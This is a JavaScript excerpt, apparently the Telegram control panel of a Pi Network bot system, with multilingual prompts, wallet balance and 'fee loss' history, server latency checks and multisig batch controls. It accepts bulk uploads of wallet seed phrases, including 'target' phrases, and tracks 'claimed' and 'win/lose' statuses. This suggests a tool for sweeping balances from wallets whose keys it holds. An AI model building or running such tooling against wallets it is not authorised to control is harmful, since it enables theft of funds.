    bumpDeleteAllDone: "✅ Semua wallet bump dihapus: {count}",
});
Object.assign(TELEGRAM_PROMPT_TEXT.en, {
    addBumpPrompt: "Send bump wallet phrases, one per line. The bot will show public keys, save them to bump.txt, then restart PM2 workers so the file is reloaded.\n\nMessages containing phrases will be deleted when possible.",
    uploadBumpPrompt: "Upload a .txt file containing bump wallet phrases. 1 line = 1 phrase. The bot will merge + dedupe into bump.txt, then restart PM2 workers.",
    bumpAdded: "✅ Bump wallets processed",
    bumpDeleted: "✅ Bump wallet deleted",
    bumpDeleteAllConfirm: "Delete all wallets in bump.txt?",
    bumpDeleteAllDone: "✅ All bump wallets deleted: {count}",
});
Object.assign(TELEGRAM_PROMPT_TEXT.ms, {
    addBumpPrompt: "Kirim phrase wallet bump satu per baris. Bot akan papar public key, simpan ke bump.txt, lalu restart worker PM2 supaya file dimuat semula.\n\nMesej berisi phrase akan cuba dipadam selepas diproses.",
    uploadBumpPrompt: "Upload fail .txt berisi phrase wallet bump. 1 baris = 1 phrase. Bot akan merge + dedupe ke bump.txt lalu restart worker PM2.",
    bumpAdded: "✅ Wallet bump diproses",
    bumpDeleted: "✅ Wallet bump dipadam",
    bumpDeleteAllConfirm: "Yakin padam semua wallet dalam bump.txt?",
    bumpDeleteAllDone: "✅ Semua wallet bump dipadam: {count}",
});

function normalizeTelegramLanguage(value, fallback = "id") {
    const code = String(value || fallback).trim().toLowerCase();
    return Object.prototype.hasOwnProperty.call(TELEGRAM_LANGUAGE_TEXT, code) ? code : fallback;
}

function getTelegramLanguageText(languageValue) {
    const code = normalizeTelegramLanguage(languageValue);
    const selected = TELEGRAM_LANGUAGE_TEXT[code] || TELEGRAM_LANGUAGE_TEXT.id;
    const selectedPrompt = TELEGRAM_PROMPT_TEXT[code] || TELEGRAM_PROMPT_TEXT.id;
    return { ...TELEGRAM_LANGUAGE_TEXT.id, ...TELEGRAM_PROMPT_TEXT.id, ...selected, ...selectedPrompt };
}

function formatTelegramLangText(template, values = {}) {
    let output = String(template || "");
    Object.entries(values || {}).forEach(([key, value]) => {
        output = output.split(`{${key}}`).join(String(value ?? ""));
    });
    return output;
}

async function getCurrentTelegramLanguageBundle() {
    try {
        const settings = await getSettings();
        const language = publicTelegramLanguageSettings(settings);
        return { language, lang: getTelegramLanguageText(language.telegram_language) };
    } catch (err) {
        const language = { telegram_language: "id", label: "🇮🇩 Indonesia", options: TELEGRAM_LANGUAGE_OPTIONS };
        return { language, lang: getTelegramLanguageText("id") };
    }
}

function publicTelegramLanguageSettings(settings) {
    const code = normalizeTelegramLanguage(settings?.telegram_language, "id");
    const option = TELEGRAM_LANGUAGE_OPTIONS.find((item) => item.code === code) || TELEGRAM_LANGUAGE_OPTIONS[0];
    return {
        telegram_language: code,
        label: option.label,
        options: TELEGRAM_LANGUAGE_OPTIONS,
        updated_at: settings?.updated_at || null,
    };
}

async function saveTelegramLanguageSettings(input) {
    const current = await getSettings();
    const telegramLanguage = normalizeTelegramLanguage(input?.telegram_language, "id");
    const next = {
        ...current,
        telegram_language: telegramLanguage,
        updated_at: utcIso(),
    };
    await saveJsonObject(SETTINGS_KEY, next);
    return next;
}

function formatPiBalanceValue(value) {
    const amount = Number.parseFloat(value);
    return Number.isFinite(amount) ? amount.toFixed(7) : null;
}

async function fetchWalletNativeBalance(publicKey) {
    const key = String(publicKey || "").trim();
    if (!key) {
        return {
            balance_pi: null,
            balance_status: "missing_public_key",
            balance_error: "Public key kosong",
        };
    }

    try {
        const response = await axios.get(`${PI_ACCOUNT_API_URL}/accounts/${encodeURIComponent(key)}`, {
            timeout: BALANCE_HTTP_TIMEOUT_MS,
        });
        const nativeBalance = (response.data?.balances || []).find((balance) => balance.asset_type === "native");
        return {
            balance_pi: formatPiBalanceValue(nativeBalance?.balance || "0"),
            balance_status: "ok",
            balance_updated_at: utcIso(),
        };
    } catch (err) {
        const statusCode = err.response?.status;
        return {
            balance_pi: statusCode === 404 ? "0.0000000" : null,
            balance_status: statusCode === 404 ? "not_found" : "error",
            balance_error: statusCode === 404 ? "Account belum aktif di jaringan Pi" : err.message,
            balance_updated_at: utcIso(),
        };
    }
}

function formatPiNumber(value) {
    const parsed = Number.parseFloat(value);
    return Number.isFinite(parsed) ? parsed.toFixed(7) : "0.0000000";
}

function getFundingWalletStateKey(walletId) {
    const normalizedWalletId = String(walletId || "").trim();
    return normalizedWalletId ? `${FUNDING_WALLET_STATE_KEY_PREFIX}${normalizedWalletId}` : null;
}

function calculateFundingWalletLossPi(beforePi, afterPi, fallback = "0.0000000") {
    const before = Number.parseFloat(beforePi);
    const after = Number.parseFloat(afterPi);
    if (!Number.isFinite(before) || !Number.isFinite(after)) {
        return formatPiNumber(fallback);
    }
    return formatPiNumber(Math.max(0, before - after));
}

function normalizeHistoryStroops(value) {
    try {
        const parsed = BigInt(String(value ?? "0"));
        return parsed >= 0n ? parsed : 0n;
    } catch (err) {
        return 0n;
    }
}

function parseHistoryPiToStroops(value) {
    const text = String(value ?? "").trim();
    if (!/^\d+(?:\.\d{1,7})?$/.test(text)) {
        return 0n;
    }
    const [wholePart, fractionPart = ""] = text.split(".");
    return BigInt(wholePart) * 10000000n + BigInt(fractionPart.padEnd(7, "0"));
}

function getFundingWalletHistoryRecordKey(walletId, runId) {
    const normalizedWalletId = String(walletId || "").trim();
    const normalizedRunId = String(runId || "").trim();
    if (!normalizedWalletId || !normalizedRunId) {
        return null;
    }
    const historyId = crypto.createHash("sha256").update(`${normalizedWalletId}:${normalizedRunId}`).digest("hex");
    return `${FUNDING_WALLET_HISTORY_KEY_PREFIX}${historyId}`;
}

function formatHistoryStroops(value) {
    const stroops = normalizeHistoryStroops(value);
    const whole = stroops / 10000000n;
    const fraction = (stroops % 10000000n).toString().padStart(7, "0");
    return `${whole}.${fraction}`;
}

function calculateHistoryLossStroops(beforeValue, afterValue) {
    const before = normalizeHistoryStroops(beforeValue);
    const after = normalizeHistoryStroops(afterValue);
    return before > after ? before - after : 0n;
}

async function migrateFundingWalletStatesToHistory(wallets) {
    for (const wallet of wallets) {
        const walletId = String(wallet?.id || "").trim();
        const stateKey = getFundingWalletStateKey(walletId);
        if (!walletId || !stateKey) {
            continue;
        }
        const state = await loadJsonObject(stateKey, {});
        if (!state.before_pi || !state.after_pi) {
            continue;
        }
        const runId = String(state.run_id || `snapshot:${state.updated_at || walletId}`).trim();
        const historyKey = getFundingWalletHistoryRecordKey(walletId, runId);
        if (!historyKey) {
            continue;
        }
        const existing = await loadJsonObject(historyKey, {});
        if (existing.wallet_id && existing.run_id) {
            continue;
        }
        const historyId = historyKey.slice(FUNDING_WALLET_HISTORY_KEY_PREFIX.length);
        await saveJsonObject(historyKey, {
            id: historyId,
            wallet_id: walletId,
            wallet_name: String(wallet.name || "Funding Wallet"),
            wallet_public_key: String(wallet.public_key || ""),
            run_id: runId,
            bot_group: "Funding state sebelum menu riwayat aktif",
            bot_names: [],
            workers: [],
            status: "snapshot",
            amount: "",
            network: "",
            transaction_type: "",
            before_stroops: parseHistoryPiToStroops(state.before_pi).toString(),
            after_stroops: parseHistoryPiToStroops(state.after_pi).toString(),
            started_at: state.started_at || state.updated_at || utcIso(),
            updated_at: state.updated_at || state.started_at || utcIso(),
        });
    }
}

async function listFundingWalletHistory() {
    const wallets = await listWallets();
    await migrateFundingWalletStatesToHistory(wallets);
    const keys = await scanRedisKeys(`${FUNDING_WALLET_HISTORY_KEY_PREFIX}*`);
    const walletMap = new Map(wallets.map((wallet) => [String(wallet.id || ""), wallet]));
    const rawEntries = await Promise.all(keys.map((key) => loadJsonObject(key, {})));
    const entries = rawEntries
        .filter((entry) => entry && entry.wallet_id && entry.run_id)
        .map((entry) => {
            const wallet = walletMap.get(String(entry.wallet_id || ""));
            const beforeStroops = normalizeHistoryStroops(entry.before_stroops);
            const afterStroops = normalizeHistoryStroops(entry.after_stroops);
            const lossStroops = calculateHistoryLossStroops(beforeStroops, afterStroops);
            return {
                id: String(entry.id || `${entry.wallet_id}:${entry.run_id}`),
                wallet_id: String(entry.wallet_id || ""),
                wallet_name: String(entry.wallet_name || wallet?.name || "Funding Wallet"),
                wallet_public_key: String(entry.wallet_public_key || wallet?.public_key || ""),
                run_id: String(entry.run_id || ""),
                bot_group: String(entry.bot_group || ""),
                bot_names: Array.isArray(entry.bot_names) ? entry.bot_names : [],
                workers: Array.isArray(entry.workers) ? entry.workers : [],
                status: String(entry.status || "unknown"),
                amount: String(entry.amount || ""),
                network: String(entry.network || ""),
                transaction_type: String(entry.transaction_type || ""),
                before_stroops: beforeStroops.toString(),
                after_stroops: afterStroops.toString(),
                before_pi: formatHistoryStroops(beforeStroops),
                after_pi: formatHistoryStroops(afterStroops),
                loss_pi: formatHistoryStroops(lossStroops),
                started_at: entry.started_at || null,
                updated_at: entry.updated_at || entry.started_at || null,
            };
        })
        .sort((a, b) => String(b.updated_at || "").localeCompare(String(a.updated_at || "")));

    let totalLossStroops = 0n;
    const walletIds = new Set();
    for (const entry of entries) {
        totalLossStroops += calculateHistoryLossStroops(entry.before_stroops, entry.after_stroops);
        walletIds.add(entry.wallet_id);
    }
    const latest = entries[0] || null;
    return {
        entries,
        summary: {
            total_mutations: entries.length,
            total_wallets: walletIds.size,
            total_loss_pi: formatHistoryStroops(totalLossStroops),
            latest_after_pi: latest?.after_pi || "0.0000000",
            latest_wallet_name: latest?.wallet_name || "-",
            latest_updated_at: latest?.updated_at || null,
        },
    };
}

async function listWalletsWithBalances() {
    const wallets = await listWallets();

    return Promise.all(
        wallets.map(async (wallet) => {
            const stateKey = getFundingWalletStateKey(wallet.id);
            const [walletState, balanceInfo] = await Promise.all([
                stateKey ? loadJsonObject(stateKey, {}) : Promise.resolve({}),
                fetchWalletNativeBalance(wallet.public_key),
            ]);

            const beforePi = formatPiBalanceValue(walletState.before_pi);
            const savedAfterPi = formatPiBalanceValue(walletState.after_pi);
            const currentAfterPi = formatPiBalanceValue(balanceInfo.balance_pi);
            const effectiveAfterPi = currentAfterPi || savedAfterPi;
            const lossPi =
                beforePi && effectiveAfterPi
                    ? calculateFundingWalletLossPi(beforePi, effectiveAfterPi, walletState.loss_pi)
                    : formatPiNumber(walletState.loss_pi || 0);

            return {
                ...wallet,
                ...balanceInfo,
                funding_balance_before_pi: beforePi,
                funding_balance_after_pi: effectiveAfterPi,
                total_fee_loss_pi: lossPi,
                funding_fee_loss_updated_at: walletState.updated_at || null,
            };
        })
    );
}

function normalizeServerUrl(url) {
    return String(url || "").trim().replace(/\/+$/, "");
}

function parseOptionalTimeoutMs(value, fallback = 0) {
    const raw = String(value ?? "").trim().toLowerCase();
    if (!raw || ["0", "off", "none", "no", "false", "unlimited", "unlimitid"].includes(raw)) {
        return 0;
    }
    const parsed = Number.parseInt(raw, 10);
    return Number.isSafeInteger(parsed) && parsed > 0 ? parsed : fallback;
}

function getServerHost(url) {
    try {
        return new URL(normalizeServerUrl(url)).host;
    } catch (err) {
        return normalizeServerUrl(url);
    }
}

async function measureServerLatency(url) {
    const normalizedUrl = normalizeServerUrl(url);
    if (!/^https?:\/\//i.test(normalizedUrl)) {
        return {
            latency_ms: null,
            latency_status: "invalid_url",
            latency_error: "URL harus diawali http:// atau https://",
            latency_checked_at: utcIso(),
        };
    }

    const startedAt = Date.now();
    try {
        await axios.get(`${normalizedUrl}/ledgers?limit=1&order=desc`, {
            timeout: SERVER_LATENCY_TIMEOUT_MS,
        });
        return {
            latency_ms: Date.now() - startedAt,
            latency_status: "online",
            latency_checked_at: utcIso(),
        };
    } catch (err) {
        return {
            latency_ms: null,
            latency_status: err.response?.status ? `error_${err.response.status}` : "offline",
            latency_error: err.message,
            latency_checked_at: utcIso(),
        };
    }
}

async function listServersWithStats() {
    const servers = await listServers();
    return Promise.all(
        servers.map(async (server) => ({
            ...server,
            url: normalizeServerUrl(server.url),
            location: String(server.location || "").trim(),
            host: getServerHost(server.url),
            ...(await measureServerLatency(server.url)),
        }))
    );
}

async function sendTelegramMessage(text) {
    const settings = normalizeTelegramSettings(await getSettings());
    if (!settings.telegram_bot_token || !settings.telegram_chat_id) {
        throw new Error("Telegram bot token/chat id belum diset");
    }

    await axios.post(
        `https://api.telegram.org/bot${settings.telegram_bot_token}/sendMessage`,
        {
            chat_id: settings.telegram_chat_id,
            text,
        },
        { timeout: 10000 }
    );
}

const telegramControlState = {
    started: false,
    polling: false,
    offset: 0,
    pendingInputs: new Map(),
    ledgerScans: new Map(),
    multisigRuns: new Map(),
};

const TELEGRAM_TARGET_TEXT_FILE_MAX_BYTES = Number.parseInt(process.env.TELEGRAM_TARGET_TEXT_FILE_MAX_BYTES || String(2 * 1024 * 1024), 10);
const TELEGRAM_TARGET_TEXT_FILE_MAX_LINES = Number.parseInt(process.env.TELEGRAM_TARGET_TEXT_FILE_MAX_LINES || "10000", 10);

function normalizeTelegramTargetTextFileLimits() {
    return {
        maxBytes: Number.isSafeInteger(TELEGRAM_TARGET_TEXT_FILE_MAX_BYTES) && TELEGRAM_TARGET_TEXT_FILE_MAX_BYTES > 0
            ? Math.min(TELEGRAM_TARGET_TEXT_FILE_MAX_BYTES, 10 * 1024 * 1024)
            : 2 * 1024 * 1024,
        maxLines: Number.isSafeInteger(TELEGRAM_TARGET_TEXT_FILE_MAX_LINES) && TELEGRAM_TARGET_TEXT_FILE_MAX_LINES > 0
            ? Math.min(TELEGRAM_TARGET_TEXT_FILE_MAX_LINES, 50000)
            : 10000,
    };
}

const TELEGRAM_MULTISIG_RUN_TTL_MS = Number.parseInt(process.env.TELEGRAM_MULTISIG_RUN_TTL_MS || String(6 * 60 * 60 * 1000), 10);
const TELEGRAM_LIST_PAGE_SIZE = Number.parseInt(process.env.TELEGRAM_LIST_PAGE_SIZE || "8", 10);
const TELEGRAM_FUNDING_HISTORY_PAGE_SIZE = Number.parseInt(process.env.TELEGRAM_FUNDING_HISTORY_PAGE_SIZE || "5", 10);
const TELEGRAM_LIVE_LOG_PAGE_SIZE = Number.parseInt(process.env.TELEGRAM_LIVE_LOG_PAGE_SIZE || "10", 10);

function clampTelegramInt(value, fallback, min, max) {
    const parsed = Number.parseInt(String(value ?? ""), 10);
    const base = Number.isSafeInteger(parsed) ? parsed : fallback;
    return Math.min(Math.max(base, min), max);
}

function getTelegramPageSize(value, fallback, min = 1, max = 20) {
    return clampTelegramInt(value, fallback, min, max);
}

function getTelegramPage(value, totalItems, pageSize) {
    const safePageSize = Math.max(1, pageSize);
    const totalPages = Math.max(1, Math.ceil(Math.max(0, totalItems) / safePageSize));
    const page = clampTelegramInt(value, 0, 0, totalPages - 1);
    return { page, totalPages, start: page * safePageSize, end: Math.min(totalItems, (page + 1) * safePageSize) };
}

function formatTelegramShortId(value) {
    return shortKey(value, 6);
}

function formatTelegramHost(value) {
    const text = String(value || "").trim();
    if (!text || text === "N/A") return "-";
    return getServerHost(text);
}

function normalizeTelegramStatus(value) {
    const text = value === undefined || value === null || String(value).trim() === "" ? "unknown" : String(value).trim();
    return text.toLowerCase().replace(/\s+/g, "_");
}

function telegramStatusEmoji(value) {
    const normalized = normalizeTelegramStatus(value);
    const statusEmoji = {
        active: "🟢",
        cancelled: "🚫",
        claimed: "✅",
        completed: "✅",
        deleted: "🗑️",
        done: "✅",
        duplicate: "🔁",
        error: "❌",
        executing: "🚀",
        fail: "❌",
        failed: "❌",
        gagal: "❌",
        idle: "💤",
        invalid: "⚠️",
        invalid_url: "⚠️",
        locked: "🔐",
        locked_by_funding: "🔐",
        lose: "❌",
        lost: "❌",
        menang: "✅",
        missing_public_key: "⚠️",
        not_found: "❌",
        not_saved: "⚠️",
        offline: "❌",
        ok: "✅",
        online: "✅",
        paused: "⏸️",
        pending: "⏳",
        preparing: "🛠️",
        processing: "🔄",
        queued: "📥",
        running: "🔄",
        running_batch: "🚀",
        saved: "✅",
        sent: "✅",
        signer_ready: "✅",
        signer_removed: "✅",
        snapshot: "📌",
        stopped: "⏹️",
        success: "✅",
        successful: "✅",
        sukses: "✅",
        true: "✅",
        false: "❌",
        unknown: "ℹ️",
        waiting: "🕒",
        waiting_protocol_26: "🕒",
        watching: "👀",
        win: "✅",
    };
    if (statusEmoji[normalized]) return statusEmoji[normalized];
    if (normalized.startsWith("error_")) return "❌";
    if (normalized.startsWith("waiting")) return "🕒";
    if (normalized.startsWith("missing_")) return "⚠️";
    if (normalized.startsWith("invalid_")) return "⚠️";
    return "ℹ️";
}

function formatTelegramStatus(value, fallback = "unknown") {
    const rawValue = value === undefined || value === null || String(value).trim() === "" ? fallback : value;
    const raw = String(rawValue === undefined || rawValue === null || String(rawValue).trim() === "" ? "unknown" : rawValue).trim();
    const label = (raw || fallback || "unknown").replace(/_/g, " ");
    return `${label} ${telegramStatusEmoji(raw)}`;
}

function formatTelegramLatency(status, ms) {
    const normalized = normalizeTelegramStatus(status);
    const latency = Number.isFinite(Number(ms)) ? ` ${ms}ms` : "";
    if (normalized === "online") return `${formatTelegramStatus("online")}${latency}`;
    if (normalized === "invalid_url") return formatTelegramStatus("invalid_url");
    if (normalized.startsWith("error_")) return formatTelegramStatus(normalized);
    return formatTelegramStatus(normalized || "unknown");
}

function formatTelegramBotStatus(status) {
    return formatTelegramStatus(status, "waiting");
}

function buildTelegramListKeyboard({
    callbackPrefix,
    pageInfo,
    refreshText,
    refreshCallback,
    backText,
    backCallback,
    extraRows = [],
}) {
    const rows = [...extraRows];
    if (pageInfo.totalPages > 1) {
        const navRow = [];
        if (pageInfo.page > 0) {
            navRow.push({ text: "⬅️ Prev", callback_data: `${callbackPrefix}:page:${pageInfo.page - 1}` });
        }
        navRow.push({ text: `${pageInfo.page + 1}/${pageInfo.totalPages}`, callback_data: "noop" });
        if (pageInfo.page < pageInfo.totalPages - 1) {
            navRow.push({ text: "Next ➡️", callback_data: `${callbackPrefix}:page:${pageInfo.page + 1}` });
        }
        rows.push(navRow);
    }
    rows.push([{ text: refreshText, callback_data: refreshCallback }]);
    rows.push([{ text: backText, callback_data: backCallback }]);
    return { inline_keyboard: rows };
}

function cleanupTelegramMultisigRuns() {
    const now = Date.now();
    const maxAge = Number.isSafeInteger(TELEGRAM_MULTISIG_RUN_TTL_MS) && TELEGRAM_MULTISIG_RUN_TTL_MS > 0
        ? TELEGRAM_MULTISIG_RUN_TTL_MS
        : 6 * 60 * 60 * 1000;
    for (const [runId, control] of telegramControlState.multisigRuns.entries()) {
        if (now - Number(control.created_at || 0) > maxAge || control.finished_at) {
            telegramControlState.multisigRuns.delete(runId);
        }
    }
}

function createTelegramMultisigRun(chatId) {
    cleanupTelegramMultisigRuns();
    const runId = crypto.randomBytes(8).toString("hex");
    const control = {
        id: runId,
        chat_id: String(chatId || ""),
        stop_requested: false,
        created_at: Date.now(),
        stopped_at: null,
        finished_at: null,
    };
    telegramControlState.multisigRuns.set(runId, control);
    return control;
}

function requestTelegramMultisigRunStop(chatId, runId) {
    cleanupTelegramMultisigRuns();
    const control = telegramControlState.multisigRuns.get(String(runId || ""));
    if (!control || String(control.chat_id || "") !== String(chatId || "") || control.finished_at) {
        return null;
    }
    control.stop_requested = true;
    control.stopped_at = control.stopped_at || Date.now();
    return control;
}

function isTelegramMultisigRunStopRequested(runId) {
    const control = telegramControlState.multisigRuns.get(String(runId || ""));
    return Boolean(control && control.stop_requested && !control.finished_at);
}

function finishTelegramMultisigRun(runId) {
    const control = telegramControlState.multisigRuns.get(String(runId || ""));
    if (control) {
        control.finished_at = Date.now();
    }
}

function telegramMultisigRunKeyboard(runId, lang = {}) {
    return {
        inline_keyboard: [
            [{ text: lang.stopBatch || "⛔ Stop Batch", callback_data: `multi:stop:${runId}` }],
        ],
    };
}

function escapeTelegramHtml(value) {
    return String(value ?? "")
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;");
}

function shortKey(value, visible = 6) {
    const text = String(value || "");
    if (!text) {
        return "-";
    }
    return text.length <= visible * 2 ? text : `${text.slice(0, visible)}...${text.slice(-visible)}`;
}

function splitTelegramText(text, maxLength = 3800) {
    const lines = String(text || "").split("\n");
    const chunks = [];
    let current = "";
    for (const line of lines) {
        if ((current + "\n" + line).length > maxLength) {
            if (current) {
                chunks.push(current);
            }
            current = line;
        } else {
            current = current ? `${current}\n${line}` : line;
        }
    }
    if (current) {
        chunks.push(current);
    }
    return chunks.length ? chunks : [""];
}


function chunkTelegramButtons(buttons, size = 2) {
    const width = Number.isSafeInteger(Number(size)) && Number(size) > 0 ? Number(size) : 2;
    const items = Array.isArray(buttons) ? buttons.filter(Boolean) : [];
    const rows = [];
    for (let index = 0; index < items.length; index += width) {
        rows.push(items.slice(index, index + width));
    }
    return rows;
}

function telegramMainKeyboard(languageValue = "id") {
    const lang = getTelegramLanguageText(languageValue);
    return {
        inline_keyboard: [
            [
                { text: lang.settings, callback_data: "menu:settings" },
                { text: lang.timezone, callback_data: "menu:timezone" },
            ],
            [
                { text: lang.server, callback_data: "menu:servers" },
                { text: lang.worker, callback_data: "menu:workers" },
            ],
            [
                { text: lang.funding, callback_data: "menu:funding" },
                { text: lang.destination, callback_data: "menu:destinations" },
            ],
            [
                { text: lang.bumpWallets || "🧾 Bump Wallet", callback_data: "menu:bump" },
            ],
            [
                { text: lang.botTx, callback_data: "menu:bots" },
                { text: lang.multisig, callback_data: "menu:multisig" },
            ],
            [
                { text: lang.checkLedger, callback_data: "menu:ledger" },
                { text: lang.fundingHistory, callback_data: "menu:funding_history" },
            ],
            [
                { text: lang.liveLogs, callback_data: "menu:logs" },
                { text: lang.language, callback_data: "menu:language" },
            ],
            [
                { text: lang.refresh, callback_data: "menu:home" },
            ],
        ],
    };
}

function telegramBackKeyboard(target = "menu:home", languageValue = "id") {
    const lang = getTelegramLanguageText(languageValue);
    return { inline_keyboard: [[{ text: lang.back, callback_data: target }]] };
}

async function telegramApi(method, payload = {}) {
    const settings = normalizeTelegramSettings(await getSettings());
    if (!settings.telegram_bot_token) {
        throw new Error("Telegram bot token belum diset");
    }
    const response = await axios.post(
        `https://api.telegram.org/bot${settings.telegram_bot_token}/${method}`,
        payload,
        { timeout: 30000 }
    );
    return response.data;
}

async function getTelegramBotTokenForFileDownload() {
    const settings = normalizeTelegramSettings(await getSettings());
    if (!settings.telegram_bot_token) {
        throw new Error("Telegram bot token belum diset");
    }
    return settings.telegram_bot_token;
}

function isTelegramTextDocument(document) {
    const filename = String(document?.file_name || "").trim();
    const mimeType = String(document?.mime_type || "").trim().toLowerCase();
    return /\.txt$/i.test(filename) || mimeType === "text/plain";
}

async function telegramDownloadTextDocument(document, lang = getTelegramLanguageText("id")) {
    if (!document?.file_id) {
        throw new Error(lang.targetFileInvalidTelegram);
    }
    if (!isTelegramTextDocument(document)) {
        throw new Error(lang.targetFileInvalid);
    }

    const { maxBytes } = normalizeTelegramTargetTextFileLimits();
    const fileSize = Number.parseInt(document.file_size || "0", 10);
    if (Number.isSafeInteger(fileSize) && fileSize > maxBytes) {
        throw new Error(formatTelegramLangText(lang.targetFileTooLarge, { max: Math.round(maxBytes / 1024 / 1024) }));
    }

    const token = await getTelegramBotTokenForFileDownload();
    const fileInfo = await telegramApi("getFile", { file_id: document.file_id });
    const filePath = fileInfo?.result?.file_path;
    if (!filePath) {
        throw new Error(lang.targetFilePathFailed);
    }

    const response = await axios.get(
        `https://api.telegram.org/file/bot${token}/${filePath}`,
        {
            responseType: "arraybuffer",
            timeout: 30000,
            maxContentLength: maxBytes + 1024,
            maxBodyLength: maxBytes + 1024,
        }
    );
    const buffer = Buffer.from(response.data || []);
    if (buffer.length > maxBytes) {
        throw new Error(formatTelegramLangText(lang.targetFileTooLarge, { max: Math.round(maxBytes / 1024 / 1024) }));
    }

    return buffer.toString("utf8").replace(/^\uFEFF/, "");
}

async function readTelegramTargetInputText(message, state, lang = getTelegramLanguageText("id")) {
    const typedText = String(message.text || message.caption || "").trim();
    const canUseFile = ["target_phrases", "target_public_keys", "save_wallet_phrases", "signer_test_phrase", "signer_wallet_phrases"].includes(String(state?.step || ""));
    if (canUseFile && message.document) {
        const fileText = await telegramDownloadTextDocument(message.document, lang);
        return {
            text: String(fileText || "").trim(),
            source: "file",
            filename: String(message.document.file_name || "targets.txt"),
        };
    }
    if (typedText) {
        return { text: typedText, source: "message", filename: "" };
    }
    return { text: "", source: "message", filename: "" };
}

async function telegramGetUpdates(settings) {
    const response = await axios.get(
        `https://api.telegram.org/bot${settings.telegram_bot_token}/getUpdates`,
        {
            params: {
                timeout: 25,
                offset: telegramControlState.offset,
                allowed_updates: JSON.stringify(["message", "callback_query"]),
            },
            timeout: 35000,
        }
    );
    return response.data?.result || [];
}

async function telegramSend(chatId, text, keyboard = null, extra = {}) {
    const chunks = splitTelegramText(text);
    let last = null;
    for (let index = 0; index < chunks.length; index += 1) {
        const isLast = index === chunks.length - 1;
        last = await telegramApi("sendMessage", {
            chat_id: chatId,
            text: chunks[index],
            parse_mode: "HTML",
            disable_web_page_preview: true,
            ...(isLast && keyboard ? { reply_markup: keyboard } : {}),
            ...extra,
        });
        if (isLast && keyboard) {
            rememberTelegramUiMessage(chatId, getTelegramResponseMessageId(last));
        }
    }
    return last;
}

async function telegramEditOrSend(callbackQuery, text, keyboard = null) {
    const chatId = callbackQuery.message?.chat?.id;
    const messageId = callbackQuery.message?.message_id;
    if (!chatId || !messageId) {
        return telegramSend(chatId, text, keyboard);
    }

    if (callbackQuery.__auto_clean_message) {
        await cleanupTelegramUiMessages(chatId, messageId);
        const deleted = await telegramDeleteMessageSafe(chatId, messageId);
        forgetTelegramUiMessage(chatId, messageId);
        callbackQuery.__auto_clean_message = false;
        if (deleted) {
            const sent = await telegramSend(chatId, text, keyboard);
            updateCallbackQueryMessageId(callbackQuery, getTelegramResponseMessageId(sent));
            return sent;
        }
    }

    try {
        await telegramApi("editMessageText", {
            chat_id: chatId,
            message_id: callbackQuery.message?.message_id || messageId,
            text,
            parse_mode: "HTML",
            disable_web_page_preview: true,
            ...(keyboard ? { reply_markup: keyboard } : {}),
        });
        rememberTelegramUiMessage(chatId, callbackQuery.message?.message_id || messageId);
    } catch (err) {
        const sent = await telegramSend(chatId, text, keyboard);
        updateCallbackQueryMessageId(callbackQuery, getTelegramResponseMessageId(sent));
        return sent;
    }
}

async function telegramAnswerCallback(callbackQuery, text = "") {
    try {
        await telegramApi("answerCallbackQuery", {
            callback_query_id: callbackQuery.id,
            text,
            show_alert: false,
        });
    } catch (err) {
        // Ignore callback answer failures.
    }
}

async function telegramDeleteMessageSafe(chatId, messageId) {
    const numericMessageId = Number.parseInt(String(messageId || ""), 10);
    if (!chatId || !Number.isSafeInteger(numericMessageId) || numericMessageId <= 0) {
        return false;
    }
    try {
        await telegramApi("deleteMessage", {
            chat_id: chatId,
            message_id: numericMessageId,
        });
        return true;
    } catch (err) {
        return false;
    }
}

function telegramUiHistoryKey(chatId) {
    return String(chatId || "");
}

function rememberTelegramUiMessage(chatId, messageId) {
    const key = telegramUiHistoryKey(chatId);
    const numericMessageId = Number.parseInt(String(messageId || ""), 10);
    if (!key || !Number.isSafeInteger(numericMessageId) || numericMessageId <= 0) {
        return;
    }
    const existing = Array.isArray(telegramUiMessageHistory.get(key)) ? telegramUiMessageHistory.get(key) : [];
    const next = existing.filter((id) => Number(id) !== numericMessageId);
    next.push(numericMessageId);
    telegramUiMessageHistory.set(key, next.slice(-8));
}

function forgetTelegramUiMessage(chatId, messageId) {
    const key = telegramUiHistoryKey(chatId);
    const numericMessageId = Number.parseInt(String(messageId || ""), 10);
    if (!key || !Number.isSafeInteger(numericMessageId) || numericMessageId <= 0) {
        return;
    }
    const existing = Array.isArray(telegramUiMessageHistory.get(key)) ? telegramUiMessageHistory.get(key) : [];
    const next = existing.filter((id) => Number(id) !== numericMessageId);
    if (next.length) {
        telegramUiMessageHistory.set(key, next);
    } else {
        telegramUiMessageHistory.delete(key);
    }
}

async function cleanupTelegramUiMessages(chatId, keepMessageId = null) {
    const key = telegramUiHistoryKey(chatId);
    if (!key) {
        return;
    }
    const keepId = Number.parseInt(String(keepMessageId || ""), 10);
    const existing = Array.isArray(telegramUiMessageHistory.get(key)) ? telegramUiMessageHistory.get(key) : [];
    const ids = [...new Set(existing.map((id) => Number.parseInt(String(id), 10)).filter((id) => Number.isSafeInteger(id) && id > 0 && id !== keepId))];
    if (!ids.length) {
        return;
    }
    const stillExisting = [];
    for (const messageId of ids.slice(-8)) {
        const deleted = await telegramDeleteMessageSafe(chatId, messageId);
        if (!deleted) {
            stillExisting.push(messageId);
        }
    }
    const next = [];
    if (Number.isSafeInteger(keepId) && keepId > 0) {
        next.push(keepId);
    }
    next.push(...stillExisting.slice(-3));
    if (next.length) {
        telegramUiMessageHistory.set(key, [...new Set(next)].slice(-8));
    } else {
        telegramUiMessageHistory.delete(key);
    }
}

function shouldAutoCleanTelegramCallback(data) {
    const value = String(data || "");
    if (!value || value === "noop") {
        return false;
    }
    return true;
}

function updateCallbackQueryMessageId(callbackQuery, messageId) {
    const numericMessageId = Number.parseInt(String(messageId || ""), 10);
    if (!callbackQuery?.message || !Number.isSafeInteger(numericMessageId) || numericMessageId <= 0) {
        return;
    }
    callbackQuery.message.message_id = numericMessageId;
}

async function telegramDeleteUserMessage(message) {
    await telegramDeleteMessageSafe(message.chat.id, message.message_id);
}

async function isAuthorizedTelegramChat(chatId) {
    const settings = normalizeTelegramSettings(await getSettings());
    return String(chatId || "") === String(settings.telegram_chat_id || "");
}

async function renderTelegramHome(chatId, editQuery = null) {
    const [settings, servers, workers, wallets, destinations, bots] = await Promise.all([
        getSettings(),
        listServers().catch(() => []),
        listWorkers().catch(() => []),
        listWallets().catch(() => []),
        listDestinations().catch(() => []),
        listBots().catch(() => []),
    ]);
    const timezone = publicTimezoneSettings(settings);
